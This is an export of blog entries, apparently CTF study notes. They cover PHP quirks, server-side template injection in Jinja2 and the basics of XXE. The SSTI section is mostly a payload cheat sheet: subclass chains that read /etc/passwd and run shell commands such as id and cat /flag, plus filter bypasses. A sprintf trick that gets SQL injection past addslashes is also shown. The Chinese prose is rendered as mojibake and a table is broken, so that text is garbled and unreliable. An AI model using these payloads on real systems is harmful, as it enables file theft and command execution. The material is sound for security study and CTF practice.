<h3 id="18-æ­£åˆ™è¡¨è¾¾å¼æº¢å‡º"><a href="#18-æ­£åˆ™è¡¨è¾¾å¼æº¢å‡º" class="headerlink" title="18.æ­£åˆ™è¡¨è¾¾å¼æº¢å‡º:"></a>18.æ­£åˆ™è¡¨è¾¾å¼æº¢å‡º:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">æ­£åˆ™(pcre)æœ€å¤§å›æº¯/é€’å½’é™åˆ¶</span><br><span class="line">    åœ¨ä½¿ç”¨.*?ctfshowéè´ªå©ªæ¨¡å¼æ—¶--åŒ¹é…åˆ°äº†ctfshowï¼Œä½†æ˜¯å¦‚æœctfshowå‰é¢æœ‰<span class="number">10</span>ä¸‡ä¸ªå­—ç¬¦ï¼Œé‚£ä¹ˆæ­£åˆ™ä¼šè¿”å›<span class="literal">false</span></span><br><span class="line">        --ä½¿ç”¨éè´ªå©ªæ¨¡å¼, éè´ªå©ªæ¨¡å¼åŒ¹é…åŸç†ç®€å•æ¥è¯´æ˜¯, åœ¨å¯é…ä¹Ÿå¯ä¸é…çš„æƒ…å†µä¸‹, ä¼˜å…ˆä¸åŒ¹é…. è®°å½•å¤‡é€‰çŠ¶æ€, å¹¶å°†åŒ¹é…æ§åˆ¶äº¤ç»™æ­£åˆ™è¡¨è¾¾å¼çš„ä¸‹ä¸€ä¸ªåŒ¹é…å­—ç¬¦, å½“ä¹‹åçš„åŒ¹é…å¤±è´¥çš„æ—¶å€™, å†æº¯, è¿›è¡ŒåŒ¹é….</span><br><span class="line">        --é»˜è®¤çš„backtrack_limitæ˜¯<span class="number">100000</span></span><br></pre></td></tr></table></figure>

<h3 id="19-phpè¿ç®—ç¬¦ä¼˜å…ˆçº§"><a href="#19-phpè¿ç®—ç¬¦ä¼˜å…ˆçº§" class="headerlink" title="19.phpè¿ç®—ç¬¦ä¼˜å…ˆçº§"></a>19.phpè¿ç®—ç¬¦ä¼˜å…ˆçº§</h3><table>
<thead>
<tr>
<th>ä¼˜å…ˆçº§</th>
<th>è¿ç®—ç¬¦</th>
<th>æè¿°</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td><code>()</code></td>
<td>æ‹¬å·ï¼ˆè¡¨è¾¾å¼åˆ†ç»„ï¼‰</td>
<td>&#96;($a &amp;&amp; $b)</td>
</tr>
<tr>
<td>2</td>
<td><code>!</code></td>
<td>é€»è¾‘é</td>
<td><code>!$a</code></td>
</tr>
<tr>
<td>3</td>
<td><code>* / %</code></td>
<td>ä¹˜ &#x2F; é™¤ &#x2F; å–æ¨¡</td>
<td><code>$a * $b</code>, <code>$a % $b</code></td>
</tr>
<tr>
<td>4</td>
<td><code>+ -</code></td>
<td>åŠ  &#x2F; å‡</td>
<td><code>$a + $b</code></td>
</tr>
<tr>
<td>5</td>
<td><code>.</code></td>
<td>å­—ç¬¦ä¸²è¿æ¥</td>
<td><code>$a . $b</code></td>
</tr>
<tr>
<td>6</td>
<td><code>&lt; &gt; &lt;= &gt;=</code></td>
<td>æ¯”è¾ƒå¤§å°</td>
<td><code>$a &lt; $b</code>, <code>$a &gt;= $b</code></td>
</tr>
<tr>
<td>7</td>
<td><code>== != === !==</code></td>
<td>ç›¸ç­‰ &#x2F; ä¸ç­‰ &#x2F; å…¨ç­‰ç­‰</td>
<td><code>$a === $b</code>, <code>$a != $b</code></td>
</tr>
<tr>
<td>8</td>
<td><code>&amp;</code></td>
<td>æŒ‰ä½ä¸</td>
<td><code>$a &amp; $b</code></td>
</tr>
<tr>
<td>9</td>
<td><code>^</code></td>
<td>æŒ‰ä½å¼‚æˆ–</td>
<td><code>$a ^ $b</code></td>
</tr>
<tr>
<td>10</td>
<td>&#96;</td>
<td>&#96;</td>
<td>æŒ‰ä½æˆ–</td>
</tr>
<tr>
<td>11</td>
<td><code>&amp;&amp;</code></td>
<td>é€»è¾‘ä¸ï¼ˆçŸ­è·¯ï¼‰</td>
<td><code>$a &amp;&amp; $b</code></td>
</tr>
<tr>
<td>12</td>
<td>&#96;</td>
<td></td>
<td>&#96;</td>
</tr>
<tr>
<td>13</td>
<td><code>?:</code></td>
<td>ä¸‰å…ƒè¿ç®—ï¼ˆæ¡ä»¶è¡¨è¾¾å¼ï¼‰</td>
<td><code>$a ? $b : $c</code></td>
</tr>
<tr>
<td>14</td>
<td><code>=</code> <code>+=</code> <code>-=</code> ç­‰</td>
<td>èµ‹å€¼åŠå¤åˆèµ‹å€¼</td>
<td><code>$a = $b</code>, <code>$a += 1</code></td>
</tr>
<tr>
<td>15</td>
<td><code>and</code></td>
<td>é€»è¾‘ä¸ï¼ˆä½ä¼˜å…ˆï¼‰</td>
<td><code>$a = true and false</code></td>
</tr>
<tr>
<td>16</td>
<td><code>or</code></td>
<td>é€»è¾‘æˆ–ï¼ˆæœ€ä½ä¼˜å…ˆï¼‰</td>
<td><code>$a = false or true</code></td>
</tr>
</tbody></table>
<h3 id="20-parse-str-å‡½æ•°"><a href="#20-parse-str-å‡½æ•°" class="headerlink" title="20.parse_str()å‡½æ•°:"></a>20.parse_str()å‡½æ•°:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="keyword">string</span> <span class="variable">$string</span>, <span class="keyword">array</span> &amp;<span class="variable">$result</span>): <span class="keyword">void</span></span><br><span class="line">å¦‚æœ <span class="keyword">string</span> æ˜¯ URL ä¼ é€’å…¥çš„æŸ¥è¯¢å­—ç¬¦ä¸²ï¼ˆquery <span class="keyword">string</span>ï¼‰ï¼Œ</span><br><span class="line">åˆ™å°†å®ƒè§£æä¸ºå˜é‡å¹¶è®¾ç½®åˆ°å½“å‰ä½œç”¨åŸŸï¼ˆå¦‚æœæä¾›äº† result åˆ™ä¼šè®¾ç½®åˆ°è¯¥æ•°ç»„é‡Œ ï¼‰</span><br><span class="line">æåº¦ä¸å»ºè®®åœ¨æ²¡æœ‰ result å‚æ•°çš„æƒ…å†µä¸‹ä½¿ç”¨æ­¤å‡½æ•°ï¼Œ å¹¶ä¸”åœ¨ PHP <span class="number">7.2</span> ä¸­å°†åºŸå¼ƒä¸è®¾ç½®å‚æ•°çš„è¡Œä¸ºã€‚</span><br><span class="line">PHP <span class="number">8.0</span>.<span class="number">0</span> èµ·ï¼Œresult å‚æ•°æ˜¯å¼ºåˆ¶çš„ã€‚</span><br><span class="line">å¯¹äº<span class="title function_ invoke__">parse_str</span>()ï¼Œå¦‚æœä¼ å…¥çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä¾‹å¦‚arr[]=<span class="number">1</span>ï¼Œåˆ™ä¼šå°†å˜é‡ä¿å­˜åœ¨æ•°ç»„å½“ä¸­arr[<span class="number">0</span>]=<span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<h3 id="21-ç±»"><a href="#21-ç±»" class="headerlink" title="21.ç±»"></a>21.ç±»</h3><h4 id="1-éé™æ€æ–¹æ³•-æ— static"><a href="#1-éé™æ€æ–¹æ³•-æ— static" class="headerlink" title="1.éé™æ€æ–¹æ³•(æ— static)"></a>1.éé™æ€æ–¹æ³•(æ— static)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ç›´æ¥<span class="keyword">new</span>ä¸€ä¸ªå¯¹è±¡ï¼Œé€šè¿‡å¯¹è±¡æ¥è¿›è¡Œè°ƒç”¨</span><br></pre></td></tr></table></figure>

<h4 id="2-é™æ€æ–¹æ³•-static"><a href="#2-é™æ€æ–¹æ³•-static" class="headerlink" title="2.é™æ€æ–¹æ³•(static)"></a>2.é™æ€æ–¹æ³•(static)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">é™æ€æ–¹æ³•åœ¨ç±»ctfshowï¼Œé™åˆ¶äº†ä¸èƒ½å»<span class="keyword">new</span>ï¼Œç›´æ¥::è°ƒç”¨å³å¯</span><br></pre></td></tr></table></figure>

<h3 id="22-call-user-func-å‡½æ•°ä¸call-user-func-array-å‡½æ•°ç±»ä¼¼"><a href="#22-call-user-func-å‡½æ•°ä¸call-user-func-array-å‡½æ•°ç±»ä¼¼" class="headerlink" title="22.call_user_func()å‡½æ•°ä¸call_user_func_array()å‡½æ•°ç±»ä¼¼:"></a>22.call_user_func()å‡½æ•°ä¸call_user_func_array()å‡½æ•°ç±»ä¼¼:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>, <span class="keyword">mixed</span> ...<span class="variable">$args</span>): <span class="keyword">mixed</span></span><br><span class="line">                 ç¬¬ä¸€ä¸ªå‚æ•° callback æ˜¯è¢«è°ƒç”¨çš„å›è°ƒå‡½æ•°ï¼Œå…¶ä½™å‚æ•°æ˜¯å›è°ƒå‡½æ•°çš„å‚æ•°ã€‚</span><br><span class="line"> --å¦‚æœä¼ é€’ä¸€ä¸ªæ•°ç»„ï¼Œå¯¹äºç±»æ¥è¯´ï¼Œä¼šæŠŠæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ å½“ä½œç±»åï¼Œç¬¬äºŒä¸ªå…ƒç´ å½“ä½œç±»çš„å‡½æ•°</span><br></pre></td></tr></table></figure>

<h3 id="23-PHP-å¼±ç±»å‹ç‰¹æ€§"><a href="#23-PHP-å¼±ç±»å‹ç‰¹æ€§" class="headerlink" title="23.PHP å¼±ç±»å‹ç‰¹æ€§(&#x3D;&#x3D;)"></a>23.PHP å¼±ç±»å‹ç‰¹æ€§(&#x3D;&#x3D;)</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PHP å¼±æ¯”è¾ƒ == çš„è½¬æ¢è§„åˆ™ï¼š</span><br><span class="line">   å¦‚æœä¸€è¾¹æ˜¯æ•°å­—ï¼Œå¦ä¸€è¾¹æ˜¯å­—ç¬¦ä¸²ï¼ŒPHP ä¼šå°è¯•æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—ï¼  </span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>æ¯”è¾ƒç±»å‹</th>
<th>PHPè¡Œä¸º</th>
</tr>
</thead>
<tbody><tr>
<td>æ•°å­— vs å­—ç¬¦ä¸²</td>
<td>å­—ç¬¦ä¸²ä¼šè¢«<strong>å¼ºåˆ¶è½¬æ¢ä¸ºæ•°å­—</strong>å†æ¯”è¾ƒ</td>
</tr>
<tr>
<td>å­—ç¬¦ä¸² vs å­—ç¬¦ä¸²ï¼ˆè‹¥ä¸€æ–¹çœ‹èµ·æ¥åƒæ•°å­—ï¼‰</td>
<td>ä¼šå°è¯•<strong>ä¸¤è¾¹éƒ½è½¬æˆæ•°å­—</strong>å†æ¯”è¾ƒ</td>
</tr>
<tr>
<td>å¸ƒå°” vs ä»»æ„ç±»å‹</td>
<td>ä¼šéƒ½è½¬æˆå¸ƒå°”å€¼å†æ¯”è¾ƒ</td>
</tr>
<tr>
<td>æ•°ç»„&#x2F;å¯¹è±¡ vs æ ‡é‡</td>
<td>ä¸€å¾‹ä¸º <code>false</code></td>
</tr>
</tbody></table>
<h3 id="24-create-function-å‡½æ•°"><a href="#24-create-function-å‡½æ•°" class="headerlink" title="24.create_function()å‡½æ•°:"></a>24.create_function()å‡½æ•°:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">å‡½æ•°å·²è‡ª PHP <span class="number">7.2</span>.<span class="number">0</span> èµ·è¢«åºŸå¼ƒï¼Œå¹¶è‡ª PHP <span class="number">8.0</span>.<span class="number">0</span> èµ·è¢«ç§»é™¤ã€‚</span><br><span class="line">    <span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>, <span class="keyword">string</span> <span class="variable">$code</span>): <span class="keyword">string</span>    ç¬¬ä¸€ä¸ª</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ssti</title>
    <url>/2025/06/02/ctfshow/ssti/</url>
    <content><![CDATA[<h1 id="å¸¸è§æ£€æµ‹"><a href="#å¸¸è§æ£€æµ‹" class="headerlink" title="å¸¸è§æ£€æµ‹:"></a>å¸¸è§æ£€æµ‹:</h1><table>
<thead>
<tr>
<th>è¯­è¨€</th>
<th>æ¨¡æ¿å¼•æ“</th>
<th>ç¤ºä¾‹ Payload</th>
</tr>
</thead>
<tbody><tr>
<td>Python</td>
<td>Jinja2</td>
<td><code>&#123;&#123;7*7&#125;&#125;</code> â†’ 49</td>
</tr>
<tr>
<td>Python</td>
<td>Mako</td>
<td><code>$&#123;7*7&#125;</code> â†’ 49</td>
</tr>
<tr>
<td>PHP</td>
<td>Smarty</td>
<td><code>&#123;$smarty.version&#125;</code></td>
</tr>
<tr>
<td>Java</td>
<td>FreeMarker</td>
<td><code>$&#123;7*7&#125;</code> â†’ 49</td>
</tr>
<tr>
<td>Java</td>
<td>Velocity</td>
<td><code>#set($x=7*7) $x</code></td>
</tr>
<tr>
<td>Node.js</td>
<td>EJS</td>
<td><code>&lt;%= 7*7 %&gt;</code></td>
</tr>
</tbody></table>
<p><img src="C:\Users\wanyan\AppData\Roaming\Typora\typora-user-images\image-20250527155737650.png" alt="image-20250527155737650"></p>
<h1 id="å„ä¸ªæ¨¡å—"><a href="#å„ä¸ªæ¨¡å—" class="headerlink" title="å„ä¸ªæ¨¡å—:"></a>å„ä¸ªæ¨¡å—:</h1><h2 id="1-jinja2"><a href="#1-jinja2" class="headerlink" title="1.jinja2:"></a>1.jinja2:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ§åˆ¶ç»“æ„ &#123;% %&#125;</span><br><span class="line">å˜é‡å–å€¼ &#123;&#123; &#125;&#125;</span><br><span class="line">æ³¨é‡Š &#123;# #&#125;</span><br><span class="line">æŸ¥çœ‹æ‰€æœ‰æ¨¡å—:</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="1-Python-2-7"><a href="#1-Python-2-7" class="headerlink" title="1. Python 2.7"></a>1. Python 2.7</h3><h4 id="1-è·å–åŸºç±»"><a href="#1-è·å–åŸºç±»" class="headerlink" title="1. è·å–åŸºç±»:"></a>1. è·å–åŸºç±»:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br></pre></td></tr></table></figure>


<h4 id="2-æ–‡ä»¶æ“ä½œ"><a href="#2-æ–‡ä»¶æ“ä½œ" class="headerlink" title="2. æ–‡ä»¶æ“ä½œ:"></a>2. æ–‡ä»¶æ“ä½œ:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ‰¾åˆ° file ç±»</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40]</span><br><span class="line"></span><br><span class="line"># è¯»æ–‡ä»¶</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br><span class="line"></span><br><span class="line"># å†™æ–‡ä»¶</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[40](&#x27;/tmp/test&#x27;,&#x27;w&#x27;).write(&#x27;test&#x27;)</span><br></pre></td></tr></table></figure>


<h4 id="3-å‘½ä»¤æ‰§è¡Œ"><a href="#3-å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="3. å‘½ä»¤æ‰§è¡Œ:"></a>3. å‘½ä»¤æ‰§è¡Œ:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æ–¹æ³•1ï¼šé€šè¿‡ func_globals.linecache.os æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br><span class="line"># æ–¹æ³•2ï¼šé€šè¿‡ __builtins__ ä¸­çš„ eval æ‰§è¡Œå‘½ä»¤</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line"></span><br><span class="line"># æ–¹æ³•3ï¼šå±æ€§å¼è°ƒç”¨ eval</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.__builtins__.eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;)</span><br><span class="line"></span><br><span class="line"># æ–¹æ³•4ï¼šè°ƒç”¨ __import__ æ‰§è¡Œå‘½ä»¤</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br><span class="line"></span><br><span class="line"># æ–¹æ³•5ï¼šç´¢å¼•æ–¹å¼è°ƒç”¨ __import__</span><br><span class="line">[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&#x27;id&#x27;).read()</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-Python-3-7"><a href="#2-Python-3-7" class="headerlink" title="2. Python 3.7"></a>2. Python 3.7</h3><h4 id="1-è·å–åŸºç±»-1"><a href="#1-è·å–åŸºç±»-1" class="headerlink" title="1. è·å–åŸºç±»:"></a>1. è·å–åŸºç±»:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[1]</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="2-æ–‡ä»¶æ“ä½œ-1"><a href="#2-æ–‡ä»¶æ“ä½œ-1" class="headerlink" title="2. æ–‡ä»¶æ“ä½œ:"></a>2. æ–‡ä»¶æ“ä½œ:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># éå†æ‰¾åˆ° catch_warnings ç±»ï¼Œå†è°ƒç”¨ open è¯»æ–‡ä»¶</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">    &#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/etc/passwd&#x27;,&#x27;r&#x27;).read() &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="3-å‘½ä»¤æ‰§è¡Œ-1"><a href="#3-å‘½ä»¤æ‰§è¡Œ-1" class="headerlink" title="3. å‘½ä»¤æ‰§è¡Œ:"></a>3. å‘½ä»¤æ‰§è¡Œ:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># éå†æ‰¾åˆ° catch_warnings ç±»ï¼Œå†ç”¨ eval è°ƒç”¨ os.popen æ‰§è¡Œå‘½ä»¤</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">  &#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">    &#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;id&#x27;).read()&quot;) &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># ä¹Ÿå¯å°è¯• popen ç›´æ¥è°ƒç”¨ï¼ˆä»…å½“ popen æœªè¢«åˆ å‡ï¼‰</span><br><span class="line">&#123;&#123;&quot;&quot;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&quot;cat /flag&quot;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">#æ— ä¸‹åˆ’çº¿ç‰ˆ</span><br><span class="line">&#123;&#123;(lipsum | attr(request.values.b)).os.popen(request.values.a).read()&#125;&#125;&amp;a=cat /flag&amp;b=__globals__</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="3-å„ç§è¿‡æ»¤"><a href="#3-å„ç§è¿‡æ»¤" class="headerlink" title="3.å„ç§è¿‡æ»¤:"></a>3.å„ç§è¿‡æ»¤:</h3><h4 id="1-ç»•è¿‡è¿‡æ»¤"><a href="#1-ç»•è¿‡è¿‡æ»¤" class="headerlink" title="1.ç»•è¿‡è¿‡æ»¤:"></a>1.<code>&#123;%%&#125;</code>ç»•è¿‡è¿‡æ»¤<code>&#123;&#123;&#125;&#125;</code>:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å°è¯•&#123;%%&#125;ï¼Œæƒ³å›æ˜¾å†…å®¹åœ¨å¤–é¢åŠ ä¸ªprintå°±è¡Œ</span><br><span class="line">&#123;%print(&quot;&quot;.__class__)%&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-getitem-ç»•è¿‡-è¿‡æ»¤ï¼š"><a href="#2-getitem-ç»•è¿‡-è¿‡æ»¤ï¼š" class="headerlink" title="2.getitem()ç»•è¿‡[]è¿‡æ»¤ï¼š"></a>2.getitem()ç»•è¿‡[]è¿‡æ»¤ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getitem() æ˜¯pythonçš„ä¸€ä¸ªé­”æœ¯æ–¹æ³•,å¯¹å­—å…¸ä½¿ç”¨æ—¶,ä¼ å…¥å­—ç¬¦ä¸²,è¿”å›å­—å…¸ç›¸åº”é”®æ‰€å¯¹åº”çš„å€¼:å½“å¯¹åˆ—è¡¨ä½¿ç”¨æ—¶,ä¼ å…¥æ•´æ•°è¿”å›åˆ—è¡¨å¯¹åº”ç´¢å¼•çš„å€¼ã€‚</span><br><span class="line">åŸæœ¬æ˜¯[117]ï¼Œä¸­æ‹¬å·è¢«banå°±ç”¨</span><br><span class="line">__getitem__(117)ä»£æ›¿[117]</span><br></pre></td></tr></table></figure>

<h4 id="3-requestæ–¹æ³•ç»•è¿‡å¼•å·ï¼š"><a href="#3-requestæ–¹æ³•ç»•è¿‡å¼•å·ï¼š" class="headerlink" title="3.requestæ–¹æ³•ç»•è¿‡å¼•å·ï¼š"></a>3.requestæ–¹æ³•ç»•è¿‡å¼•å·ï¼š</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">requeståœ¨flaskä¸­å¯ä»¥è®¿é—®åŸºäº HTTP è¯·æ±‚ä¼ é€’çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè¿™é‡Œçš„requestå¹¶épythonçš„å‡½æ•°ï¼Œè€Œæ˜¯åœ¨flaskå†…éƒ¨çš„å‡½æ•°ã€‚</span><br><span class="line">request.args.key  #è·å–getä¼ å…¥çš„keyçš„å€¼</span><br><span class="line">request.form.key  #è·å–postä¼ å…¥å‚æ•°(Content-Type:applicaation/x-www-form-urlencodedæˆ–multipart/form-data)</span><br><span class="line">reguest.values.key  #è·å–æ‰€æœ‰å‚æ•°ï¼Œå¦‚æœgetå’Œpostæœ‰åŒä¸€ä¸ªå‚æ•°ï¼Œpostçš„å‚æ•°ä¼šè¦†ç›–get</span><br><span class="line">request.cookies.key  #è·å–cookiesä¼ å…¥å‚æ•°</span><br><span class="line">request.headers.key  #è·å–è¯·æ±‚å¤´è¯·æ±‚å‚æ•°</span><br><span class="line">request.data  #è·å–postä¼ å…¥å‚æ•°(Content-Type:a/b)</span><br><span class="line">request.json  #è·å–postä¼ å…¥jsonå‚æ•° (Content-Type: application/json)</span><br></pre></td></tr></table></figure>







]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>å¸¸ç”¨å§¿åŠ¿</title>
    <url>/2025/06/02/ctfshow/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><h2 id="1-sprintfå‡½æ•°"><a href="#1-sprintfå‡½æ•°" class="headerlink" title="1.sprintfå‡½æ•°:"></a>1.sprintfå‡½æ•°:</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ä½œç”¨æ˜¯å°†æ ¼å¼åŒ–å­—ç¬¦ä¸²å†™å…¥å˜é‡ä¸­</span><br><span class="line">å‡½æ•°å½¢å¼ä¸º<span class="title function_ invoke__">sprintf</span>(format,arg1,arg2,arg++)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ä¸å¸¦å ä½ç¬¦:</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;&quot;</span>;  </span><br><span class="line"><span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="variable">$sql</span>,<span class="variable">$user</span>); </span><br><span class="line"><span class="comment">/* %\ä¼šè¢«è®¤ä¸ºæ˜¯å ä½ç¬¦ç±»ä¼¼%sï¼Œä½†æ˜¯adminæ²¡æœ‰åŒ¹é…ï¼Œç»“æœä¼šå˜ä¸ºselect * from user where username=&#x27;%\&#x27; and 1=1 #&#x27;;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">æœ‰å ä½ç¬¦:  %<span class="number">1</span>$\  æ˜¯ä¸€æ ·çš„é“ç†%<span class="number">1</span>$\ä¼šæ¶ˆå¤±</span><br></pre></td></tr></table></figure>

<hr>
<hr>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//addslashes()å‡½æ•°ï¼šåœ¨é¢„å®šä¹‰å‰é¢åŠ åæ–œæ ï¼Œé¢„å®šä¹‰ç¬¦æœ‰å•å¼•å·ï¼ˆ&#x27;ï¼‰ï¼ŒåŒå¼•å·ï¼ˆ&quot;ï¼‰ï¼Œåæ–œæ ï¼ˆ\ï¼‰ï¼ŒNULL</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$pass</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;and pass=&#x27;%s&#x27;&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]));</span><br><span class="line"><span class="variable">$sql</span>=<span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;select * from user where name=&#x27;%s&#x27; <span class="subst">$pass</span>&quot;</span>,<span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"> å½“ä¼ å…¥pass= %<span class="number">1</span>$<span class="string">&#x27; and 1=1 #     </span></span><br><span class="line"><span class="string">    å¾—åˆ° and pass=&#x27;</span>%<span class="number">1</span>$\<span class="string">&#x27; and 1=1 #&#x27;</span></span><br><span class="line">      ä¹‹åç¬¬ä¸‰æ­¥ select * <span class="keyword">from</span> user where name=<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> pass=<span class="string">&#x27;%1$\&#x27; and 1=1 #&#x27;</span>   ä½†æ˜¯%<span class="number">1</span>$\ä¼šæ¶ˆå¤±</span><br></pre></td></tr></table></figure>

<h1 id="linxuå‘½ä»¤"><a href="#linxuå‘½ä»¤" class="headerlink" title="linxuå‘½ä»¤:"></a>linxuå‘½ä»¤:</h1><h2 id="1-ä½¿ç”¨-å¯ä»¥åˆ†éš”ä¸¤ä¸ªå‘½ä»¤ä¸€èµ·æ‰§è¡Œ"><a href="#1-ä½¿ç”¨-å¯ä»¥åˆ†éš”ä¸¤ä¸ªå‘½ä»¤ä¸€èµ·æ‰§è¡Œ" class="headerlink" title="1.ä½¿ç”¨;å¯ä»¥åˆ†éš”ä¸¤ä¸ªå‘½ä»¤ä¸€èµ·æ‰§è¡Œ"></a>1.ä½¿ç”¨;å¯ä»¥åˆ†éš”ä¸¤ä¸ªå‘½ä»¤ä¸€èµ·æ‰§è¡Œ</h2>]]></content>
      <categories>
        <category>webå­¦ä¹ </category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>xxe</title>
    <url>/2025/06/02/ctfshow/xxe/</url>
    <content><![CDATA[<h1 id="xxeçš„åŸç†"><a href="#xxeçš„åŸç†" class="headerlink" title="xxeçš„åŸç†:"></a>xxeçš„åŸç†:</h1><p>å¯ä»¥é€šè¿‡æ„é€ æ¶æ„ XML æ•°æ®ï¼Œå¼•å…¥å¤–éƒ¨å®ä½“æ¥å®ç°ï¼š</p>
<ul>
<li>è¯»å–æœ¬åœ°æ•æ„Ÿæ–‡ä»¶ï¼ˆå¦‚ <code>/etc/passwd</code>ï¼‰</li>
<li>è¿›è¡Œå†…ç½‘ SSRF</li>
<li>æ‹’ç»æœåŠ¡ï¼ˆBillion Laughsï¼‰</li>
<li>æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆå°‘è§ï¼Œå–å†³äº parserï¼‰</li>
</ul>
